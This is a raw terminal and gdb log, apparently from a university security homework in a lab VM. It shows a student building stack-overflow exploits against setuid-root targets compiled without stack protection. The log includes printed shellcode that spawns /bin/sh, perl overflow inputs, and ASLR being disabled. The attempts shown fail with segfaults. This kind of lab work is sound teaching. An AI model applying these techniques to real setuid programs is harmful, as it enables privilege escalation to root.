Error in re-setting breakpoint 1: No source file named /home/student/cs5435-fa19-hw4/sploits/sploit0.c.
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????

Program received signal SIGSEGV, Segmentation fault.
0xbffff2d0 in ?? ()
(gdb)  x/x $ebp
0xbffff2d0:	0x00000001
(gdb) n
Cannot find bounds of current function
(gdb) n
Cannot find bounds of current function
(gdb) n
Cannot find bounds of current function
(gdb) n
Cannot find bounds of current function
(gdb) n
Cannot find bounds of current function
(gdb) q
A debugging session is active.

	Inferior 1 [process 2347] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../demo/get_sp 
Stack pointer (ESP): 0xbffff5d0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
                                                                                                           ?
                                                                                                           ???V
   ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
 ?
  ???V
      ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
  ?
   ???V
       ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0 
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit0
Reading symbols from sploit0...done.
(gdb) b 43
Breakpoint 1 at 0x8048609: file sploit0.c, line 43.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit0 

Breakpoint 1, main () at sploit0.c:43
43	  args[1] = result;
(gdb) x/x $eip
0x8048609 <main+174>:	0x89d8458b
(gdb) n
45	  args[2] = NULL;
(gdb) x/x $eip
0x804860f <main+180>:	0x00f045c7
(gdb) n
47	  env[0] = NULL;
(gdb) x/x $eip
0x8048616 <main+187>:	0x00e445c7
(gdb) n
48	  execve(TARGET, args, env);
(gdb) x/x $eip
0x804861d <main+194>:	0x8d04ec83
(gdb) x/x $ebp
0xbffff5a8:	0x00000000
(gdb) n
process 2652 is executing new program: /tmp/target0
Error in re-setting breakpoint 1: No source file named /home/student/cs5435-fa19-hw4/sploits/sploit0.c.
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????

Program received signal SIGSEGV, Segmentation fault.
0xbffff2a8 in ?? ()
(gdb) x/x $eip
0xbffff2a8:	0x00000000
(gdb) x/x $ebp
0xbffff2a8:	0x00000000
(gdb) Connection to localhost closed by remote host.
Connection to localhost closed.
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
student@localhost's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-70-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
0 updates are security updates.

New release '18.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed Nov 27 15:44:35 2019 from 10.0.2.2
student@5435-hw4-vm:~$ ls
cs5435-fa19-hw4  Desktop    Downloads         Music     Public     Videos
demo             Documents  examples.desktop  Pictures  Templates
student@5435-hw4-vm:~$ cd cs5435-fa19-hw4/
student@5435-hw4-vm:~/cs5435-fa19-hw4$ ls
demo  README.txt  sploits  targets
student@5435-hw4-vm:~/cs5435-fa19-hw4$ cd demo
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls
get_sp  get_sp.c  meet  meet.c  sc  simpleargs.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gdb -q meet
Reading symbols from meet...done.
(gdb) b 8
Breakpoint 1 at 0x80484a4: file meet.c, line 8.
(gdb) run `perl -e 'print "A"x399'`
Starting program: /home/student/cs5435-fa19-hw4/demo/meet `perl -e 'print "A"x399'`

Breakpoint 1, greeting (temp1=0xbff0a62b 'A' <repeats 200 times>...) at meet.c:8
8		memset(name, 0, 400);
(gdb) info frame
Stack level 0, frame at 0xbff09b14:
 eip = 0x80484a4 in greeting (meet.c:8); saved eip = 0x80484f4
 called by frame at 0xbff09b20
 source language c.
 Arglist at 0xbff09b0c, args: temp1=0xbff0a62b 'A' <repeats 200 times>...
 Locals at 0xbff09b0c, Previous frame's sp is 0xbff09b14
 Saved registers:
  ebp at 0xbff09b0c, eip at 0xbff09b10
(gdb) x/64x 0xbff09b10-32
0xbff09af0:	0x00000002	0xbff09bb4	0xbff09bc0	0x08048531
0xbff09b00:	0xb7f7a3dc	0x0804821c	0x08048519	0xbff09b18
0xbff09b10:	0x080484f4	0xbff0a62b	0x00000000	0xb7de0637
0xbff09b20:	0x00000002	0xbff09bb4	0xbff09bc0	0x00000000
0xbff09b30:	0x00000000	0x00000000	0xb7f7a000	0xb7fbec04
0xbff09b40:	0xb7fbe000	0x00000000	0xb7f7a000	0xb7f7a000
0xbff09b50:	0x00000000	0xfa71ceaf	0xa74c60bf	0x00000000
0xbff09b60:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbff09b70:	0x00000000	0xb7faf010	0xb7fa9880	0xb7fbe000
0xbff09b80:	0x00000002	0x080483a0	0x00000000	0x080483c1
0xbff09b90:	0x080484e3	0x00000002	0xbff09bb4	0x08048510
0xbff09ba0:	0x08048570	0xb7fa9880	0xbff09bac	0xb7fbe918
0xbff09bb0:	0x00000002	0xbff0a603	0xbff0a62b	0x00000000
0xbff09bc0:	0xbff0a7bb	0xbff0a7cc	0xbff0a7dc	0xbff0a7f0
0xbff09bd0:	0xbff0a80d	0xbff0a820	0xbff0a82d	0xbff0adb5
0xbff09be0:	0xbff0adc1	0xbff0ae54	0xbff0ae6b	0xbff0ae7a
(gdb) n
9		strcpy(name, temp1);
(gdb) x/64x 0xbff09b10-32
0xbff09af0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbff09b00:	0x00000000	0x00000000	0x00000000	0xbff09b18
0xbff09b10:	0x080484f4	0xbff0a62b	0x00000000	0xb7de0637
0xbff09b20:	0x00000002	0xbff09bb4	0xbff09bc0	0x00000000
0xbff09b30:	0x00000000	0x00000000	0xb7f7a000	0xb7fbec04
0xbff09b40:	0xb7fbe000	0x00000000	0xb7f7a000	0xb7f7a000
0xbff09b50:	0x00000000	0xfa71ceaf	0xa74c60bf	0x00000000
0xbff09b60:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbff09b70:	0x00000000	0xb7faf010	0xb7fa9880	0xb7fbe000
0xbff09b80:	0x00000002	0x080483a0	0x00000000	0x080483c1
0xbff09b90:	0x080484e3	0x00000002	0xbff09bb4	0x08048510
0xbff09ba0:	0x08048570	0xb7fa9880	0xbff09bac	0xb7fbe918
0xbff09bb0:	0x00000002	0xbff0a603	0xbff0a62b	0x00000000
0xbff09bc0:	0xbff0a7bb	0xbff0a7cc	0xbff0a7dc	0xbff0a7f0
0xbff09bd0:	0xbff0a80d	0xbff0a820	0xbff0a82d	0xbff0adb5
0xbff09be0:	0xbff0adc1	0xbff0ae54	0xbff0ae6b	0xbff0ae7a
(gdb) n
10		printf( "Hi %s\n", name );
(gdb) n
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
11	}
(gdb) n
main (argc=2, argv=0xbff09bb4) at meet.c:17
17		printf( "Bye \n" );
(gdb) n
Bye 
18	}
(gdb) info frame
Stack level 0, frame at 0xbff09b20:
 eip = 0x8048509 in main (meet.c:18); saved eip = 0xb7de0637
 source language c.
 Arglist at 0xbff09b18, args: argc=2, argv=0xbff09bb4
 Locals at 0xbff09b18, Previous frame's sp is 0xbff09b20
 Saved registers:
  ebp at 0xbff09b18, eip at 0xbff09b1c
(gdb) n
__libc_start_main (main=0x80484e3 <main>, argc=2, argv=0xbff09bb4, init=0x8048510 <__libc_csu_init>, 
    fini=0x8048570 <__libc_csu_fini>, rtld_fini=0xb7fa9880 <_dl_fini>, stack_end=0xbff09bac)
    at ../csu/libc-start.c:325
325	../csu/libc-start.c: No such file or directory.
(gdb) n
[Inferior 1 (process 1255) exited normally]
(gdb) n
The program is not being run.
(gdb) b 8
Breakpoint 2 at 0xb7de0540: file ../csu/libc-start.c, line 8.
(gdb) run `perl -e 'print "A"x400'`
Starting program: /home/student/cs5435-fa19-hw4/demo/meet `perl -e 'print "A"x400'`

Breakpoint 2, __libc_start_main (main=0x80484e3 <main>, argc=2, argv=0xbfee6834, 
    init=0x8048510 <__libc_csu_init>, fini=0x8048570 <__libc_csu_fini>, rtld_fini=0xb7f73880 <_dl_fini>, 
    stack_end=0xbfee682c) at ../csu/libc-start.c:134
134	../csu/libc-start.c: No such file or directory.
(gdb) q
A debugging session is active.

	Inferior 1 [process 1262] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gdb -q meet
Reading symbols from meet...done.
(gdb) b 8
Breakpoint 1 at 0x80484a4: file meet.c, line 8.
(gdb) run `perl -e 'print "A"x400'`
Starting program: /home/student/cs5435-fa19-hw4/demo/meet `perl -e 'print "A"x400'`

Breakpoint 1, greeting (temp1=0xbff7d62a 'A' <repeats 200 times>...) at meet.c:8
8		memset(name, 0, 400);
(gdb) info frame
Stack level 0, frame at 0xbff7cf94:
 eip = 0x80484a4 in greeting (meet.c:8); saved eip = 0x80484f4
 called by frame at 0xbff7cfa0
 source language c.
 Arglist at 0xbff7cf8c, args: temp1=0xbff7d62a 'A' <repeats 200 times>...
 Locals at 0xbff7cf8c, Previous frame's sp is 0xbff7cf94
 Saved registers:
  ebp at 0xbff7cf8c, eip at 0xbff7cf90
(gdb) x/64x 0xbff7cf90-32
0xbff7cf70:	0x00000002	0xbff7d034	0xbff7d040	0x08048531
0xbff7cf80:	0xb7f3b3dc	0x0804821c	0x08048519	0xbff7cf98
0xbff7cf90:	0x080484f4	0xbff7d62a	0x00000000	0xb7da1637
0xbff7cfa0:	0x00000002	0xbff7d034	0xbff7d040	0x00000000
0xbff7cfb0:	0x00000000	0x00000000	0xb7f3b000	0xb7f7fc04
0xbff7cfc0:	0xb7f7f000	0x00000000	0xb7f3b000	0xb7f3b000
0xbff7cfd0:	0x00000000	0xf7c22114	0xac768f04	0x00000000
0xbff7cfe0:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbff7cff0:	0x00000000	0xb7f70010	0xb7f6a880	0xb7f7f000
0xbff7d000:	0x00000002	0x080483a0	0x00000000	0x080483c1
0xbff7d010:	0x080484e3	0x00000002	0xbff7d034	0x08048510
0xbff7d020:	0x08048570	0xb7f6a880	0xbff7d02c	0xb7f7f918
0xbff7d030:	0x00000002	0xbff7d602	0xbff7d62a	0x00000000
0xbff7d040:	0xbff7d7bb	0xbff7d7cc	0xbff7d7dc	0xbff7d7f0
0xbff7d050:	0xbff7d80d	0xbff7d820	0xbff7d82d	0xbff7ddb5
0xbff7d060:	0xbff7ddc1	0xbff7de54	0xbff7de6b	0xbff7de7a
(gdb) n
9		strcpy(name, temp1);
(gdb) x/64x 0xbff7cf90-32
0xbff7cf70:	0x00000000	0x00000000	0x00000000	0x00000000
0xbff7cf80:	0x00000000	0x00000000	0x00000000	0xbff7cf98
0xbff7cf90:	0x080484f4	0xbff7d62a	0x00000000	0xb7da1637
0xbff7cfa0:	0x00000002	0xbff7d034	0xbff7d040	0x00000000
0xbff7cfb0:	0x00000000	0x00000000	0xb7f3b000	0xb7f7fc04
0xbff7cfc0:	0xb7f7f000	0x00000000	0xb7f3b000	0xb7f3b000
0xbff7cfd0:	0x00000000	0xf7c22114	0xac768f04	0x00000000
0xbff7cfe0:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbff7cff0:	0x00000000	0xb7f70010	0xb7f6a880	0xb7f7f000
0xbff7d000:	0x00000002	0x080483a0	0x00000000	0x080483c1
0xbff7d010:	0x080484e3	0x00000002	0xbff7d034	0x08048510
0xbff7d020:	0x08048570	0xb7f6a880	0xbff7d02c	0xb7f7f918
0xbff7d030:	0x00000002	0xbff7d602	0xbff7d62a	0x00000000
0xbff7d040:	0xbff7d7bb	0xbff7d7cc	0xbff7d7dc	0xbff7d7f0
0xbff7d050:	0xbff7d80d	0xbff7d820	0xbff7d82d	0xbff7ddb5
0xbff7d060:	0xbff7ddc1	0xbff7de54	0xbff7de6b	0xbff7de7a
(gdb) n
10		printf( "Hi %s\n", name );
(gdb) x/64x 0xbff7cf90-32
0xbff7cf70:	0x41414141	0x41414141	0x41414141	0x41414141
0xbff7cf80:	0x41414141	0x41414141	0x41414141	0xbff7cf00
0xbff7cf90:	0x080484f4	0xbff7d62a	0x00000000	0xb7da1637
0xbff7cfa0:	0x00000002	0xbff7d034	0xbff7d040	0x00000000
0xbff7cfb0:	0x00000000	0x00000000	0xb7f3b000	0xb7f7fc04
0xbff7cfc0:	0xb7f7f000	0x00000000	0xb7f3b000	0xb7f3b000
0xbff7cfd0:	0x00000000	0xf7c22114	0xac768f04	0x00000000
0xbff7cfe0:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbff7cff0:	0x00000000	0xb7f70010	0xb7f6a880	0xb7f7f000
0xbff7d000:	0x00000002	0x080483a0	0x00000000	0x080483c1
0xbff7d010:	0x080484e3	0x00000002	0xbff7d034	0x08048510
0xbff7d020:	0x08048570	0xb7f6a880	0xbff7d02c	0xb7f7f918
0xbff7d030:	0x00000002	0xbff7d602	0xbff7d62a	0x00000000
0xbff7d040:	0xbff7d7bb	0xbff7d7cc	0xbff7d7dc	0xbff7d7f0
0xbff7d050:	0xbff7d80d	0xbff7d820	0xbff7d82d	0xbff7ddb5
0xbff7d060:	0xbff7ddc1	0xbff7de54	0xbff7de6b	0xbff7de7a
(gdb) info frame
Stack level 0, frame at 0xbff7cf94:
 eip = 0x80484cc in greeting (meet.c:10); saved eip = 0x80484f4
 called by frame at 0xbff7cf08
 source language c.
 Arglist at 0xbff7cf8c, args: temp1=0xbff7d62a 'A' <repeats 200 times>...
 Locals at 0xbff7cf8c, Previous frame's sp is 0xbff7cf94
 Saved registers:
  ebp at 0xbff7cf8c, eip at 0xbff7cf90
(gdb) x/4x 0xbff7cf90
0xbff7cf90:	0x080484f4	0xbff7d62a	0x00000000	0xb7da1637
(gdb) x/4x 0xbff7cf90-4
0xbff7cf8c:	0xbff7cf00	0x080484f4	0xbff7d62a	0x00000000
(gdb) x/4x 0xbff7cf90-1
0xbff7cf8f:	0x0484f4bf	0xf7d62a08	0x000000bf	0xda163700
(gdb) x/2x 0xbff7cf90-1
0xbff7cf8f:	0x0484f4bf	0xf7d62a08
(gdb) x/x 0xbff7cf90-1
0xbff7cf8f:	0x0484f4bf
(gdb) x/x 0xbff7cf90
0xbff7cf90:	0x080484f4
(gdb) x/x 0xbff7cf90-4
0xbff7cf8c:	0xbff7cf00
(gdb) q
A debugging session is active.

	Inferior 1 [process 1267] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gdb -q meet
Reading symbols from meet...done.
(gdb) b 8
Breakpoint 1 at 0x80484a4: file meet.c, line 8.
(gdb) run `perl -e 'print "A"x399'`
Starting program: /home/student/cs5435-fa19-hw4/demo/meet `perl -e 'print "A"x399'`

Breakpoint 1, greeting (temp1=0xbfb5362b 'A' <repeats 200 times>...) at meet.c:8
8		memset(name, 0, 400);
(gdb) info frame
Stack level 0, frame at 0xbfb519c4:
 eip = 0x80484a4 in greeting (meet.c:8); saved eip = 0x80484f4
 called by frame at 0xbfb519d0
 source language c.
 Arglist at 0xbfb519bc, args: temp1=0xbfb5362b 'A' <repeats 200 times>...
 Locals at 0xbfb519bc, Previous frame's sp is 0xbfb519c4
 Saved registers:
  ebp at 0xbfb519bc, eip at 0xbfb519c0
(gdb) x/x 0xbfb519c0
0xbfb519c0:	0x080484f4
(gdb) x/x 0xbfb519c0-4
0xbfb519bc:	0xbfb519c8
(gdb) q
A debugging session is active.

	Inferior 1 [process 1282] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls
get_sp  get_sp.c  meet  meet.c  sc  simpleargs.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./get_sp
Stack pointer (ESP): 0xbfa61310
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ sudo sysctl -w kernel.randomize_va_space=0
[sudo] password for student: 
kernel.randomize_va_space = 0
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./get_sp
Stack pointer (ESP): 0xbffff5f0
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ./get_sp
Stack pointer (ESP): 0xbffff5f0
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gdb -q meet
Reading symbols from meet...done.
(gdb) b 8
Breakpoint 1 at 0x80484a4: file meet.c, line 8.
(gdb) info frame
No stack.
(gdb) run `perl -e 'print "A"x399'`
Starting program: /home/student/cs5435-fa19-hw4/demo/meet `perl -e 'print "A"x399'`

Breakpoint 1, greeting (temp1=0xbffff62b 'A' <repeats 200 times>...) at meet.c:8
8		memset(name, 0, 400);
(gdb) info frame
Stack level 0, frame at 0xbffff434:
 eip = 0x80484a4 in greeting (meet.c:8); saved eip = 0x80484f4
 called by frame at 0xbffff440
 source language c.
 Arglist at 0xbffff42c, args: temp1=0xbffff62b 'A' <repeats 200 times>...
 Locals at 0xbffff42c, Previous frame's sp is 0xbffff434
 Saved registers:
  ebp at 0xbffff42c, eip at 0xbffff430
(gdb) x/x 0xbffff430-4
0xbffff42c:	0xbffff438
(gdb) q
A debugging session is active.

	Inferior 1 [process 1297] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls
get_sp  get_sp.c  meet  meet.c  sc  simpleargs.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ cat get_sp.c 
#include <stdio.h>

unsigned long get_sp(void) 
{
	__asm__("movl %esp, %eax");
}

int main() 
{
	printf("Stack pointer (ESP): 0x%x\n", get_sp() );
}

student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ cd ../sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
sploit0.c: In function ‘main’:
sploit0.c:43:3: error: ‘args’ undeclared (first use in this function)
   args[0] = TARGET;
   ^
sploit0.c:43:3: note: each undeclared identifier is reported only once for each function it appears in
sploit0.c:48:3: error: ‘env’ undeclared (first use in this function)
   env[0] = NULL;
   ^
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit0
Reading symbols from sploit0...done.
(gdb) b 43
Breakpoint 1 at 0x804858f: file sploit0.c, line 43.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit0 

Breakpoint 1, main () at sploit0.c:43
43	  args[0] = TARGET;
(gdb) info frame
Stack level 0, frame at 0xbffff5c0:
 eip = 0x804858f in main (sploit0.c:43); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff5a8, args: 
 Locals at 0xbffff5a8, Previous frame's sp is 0xbffff5c0
 Saved registers:
  ebp at 0xbffff5a8, eip at 0xbffff5bc
(gdb) n
44	  args[1] = result;
(gdb) n
46	  args[2] = NULL;
(gdb) n
48	  env[0] = NULL;
(gdb) set follow-fork-mode child
(gdb) info frame
Stack level 0, frame at 0xbffff5c0:
 eip = 0x80485a3 in main (sploit0.c:48); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff5a8, args: 
 Locals at 0xbffff5a8, Previous frame's sp is 0xbffff5c0
 Saved registers:
  ebp at 0xbffff5a8, eip at 0xbffff5bc
(gdb) n
49	  execve(TARGET, args, env);
(gdb) info frame
Stack level 0, frame at 0xbffff5c0:
 eip = 0x80485aa in main (sploit0.c:49); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff5a8, args: 
 Locals at 0xbffff5a8, Previous frame's sp is 0xbffff5c0
 Saved registers:
  ebp at 0xbffff5a8, eip at 0xbffff5bc
(gdb) n
50	  fprintf(stderr, "execve failed.\n");
(gdb) info frame
Stack level 0, frame at 0xbffff5c0:
 eip = 0x80485c2 in main (sploit0.c:50); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff5a8, args: 
 Locals at 0xbffff5a8, Previous frame's sp is 0xbffff5c0
 Saved registers:
  ebp at 0xbffff5a8, eip at 0xbffff5bc
(gdb) n
execve failed.
52	  return 0;
(gdb) info frame
Stack level 0, frame at 0xbffff5c0:
 eip = 0x80485d9 in main (sploit0.c:52); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff5a8, args: 
 Locals at 0xbffff5a8, Previous frame's sp is 0xbffff5c0
 Saved registers:
  ebp at 0xbffff5a8, eip at 0xbffff5bc
(gdb) n
53	}
(gdb) n
__libc_start_main (main=0x804855b <main>, argc=1, argv=0xbffff654, init=0x8048600 <__libc_csu_init>, 
    fini=0x8048660 <__libc_csu_fini>, rtld_fini=0xb7fea880 <_dl_fini>, stack_end=0xbffff64c)
    at ../csu/libc-start.c:325
325	../csu/libc-start.c: No such file or directory.
(gdb) q
A debugging session is active.

	Inferior 1 [process 1387] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit0
Reading symbols from sploit0...done.
(gdb) set follow-fork-mode child
(gdb) b 46
Breakpoint 1 at 0x804859c: file sploit0.c, line 46.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit0 

Breakpoint 1, main () at sploit0.c:46
46	  args[2] = NULL;
(gdb) info frame
Stack level 0, frame at 0xbffff5c0:
 eip = 0x804859c in main (sploit0.c:46); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff5a8, args: 
 Locals at 0xbffff5a8, Previous frame's sp is 0xbffff5c0
 Saved registers:
  ebp at 0xbffff5a8, eip at 0xbffff5bc
(gdb) n
48	  env[0] = NULL;
(gdb) n
49	  execve(TARGET, args, env);
(gdb) info frame
Stack level 0, frame at 0xbffff5c0:
 eip = 0x80485aa in main (sploit0.c:49); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff5a8, args: 
 Locals at 0xbffff5a8, Previous frame's sp is 0xbffff5c0
 Saved registers:
  ebp at 0xbffff5a8, eip at 0xbffff5bc
(gdb) n
50	  fprintf(stderr, "execve failed.\n");
(gdb) info frame
Stack level 0, frame at 0xbffff5c0:
 eip = 0x80485c2 in main (sploit0.c:50); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff5a8, args: 
 Locals at 0xbffff5a8, Previous frame's sp is 0xbffff5c0
 Saved registers:
  ebp at 0xbffff5a8, eip at 0xbffff5bc
(gdb) n
execve failed.
52	  return 0;
(gdb) n
53	}
(gdb) n
__libc_start_main (main=0x804855b <main>, argc=1, argv=0xbffff654, init=0x8048600 <__libc_csu_init>, 
    fini=0x8048660 <__libc_csu_fini>, rtld_fini=0xb7fea880 <_dl_fini>, stack_end=0xbffff64c)
    at ../csu/libc-start.c:325
325	../csu/libc-start.c: No such file or directory.
(gdb) n
[Inferior 1 (process 1393) exited normally]
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
result : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cd ../targets/
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls
Makefile  target0.c  target1.c  target2.c  target3.c  target4.c
target0   target1    target2    target3    target4
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo make
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target0 target0.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target1 target1.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target2 target2.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target3 target3.c
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o target4 target4.c
install -o root -t /tmp target0 target1 target2 target3 target4
chmod 4755 /tmp/target*
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./splot0
-bash: ./splot0: No such file or directory
